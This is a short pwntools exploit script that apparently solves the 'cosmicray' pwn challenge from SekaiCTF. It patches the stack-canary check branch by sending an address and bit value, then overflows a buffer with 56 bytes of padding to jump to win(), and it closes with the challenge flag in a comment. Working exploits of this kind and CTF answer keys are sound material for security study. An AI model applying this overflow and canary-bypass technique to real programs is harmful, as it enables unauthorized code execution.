#!/usr/bin/env python3

from pwn import *

elf = ELF("cosmicray.elf")
# libc = ELF("./libc-2.31.so", checksec=False)
# g = ROP(libc)

s  = remote("chals.sekai.team", 4077)
# s = process(["./ld-2.35.so", elf.path], env={"LD_PRELOAD":"./libc-2.35.so"})

def main():

	addr = elf.sym.main+171				# jz 	(___stack_chk_fail)
	s.sendline(hex(addr).encode())
	s.sendline(b'7')					# jnz 	(___stack_chk_fail)
	
	pl = flat(							# BoF to call win()
		cyclic(56),
		p64(elf.sym.win)
	)
	s.sendline(pl)

	s.interactive()


# SEKAI{w0w_pwn_s0_ez_wh3n_I_can_s3nd_a_c05m1c_ray_thru_ur_cpu}

if __name__=="__main__":
	main()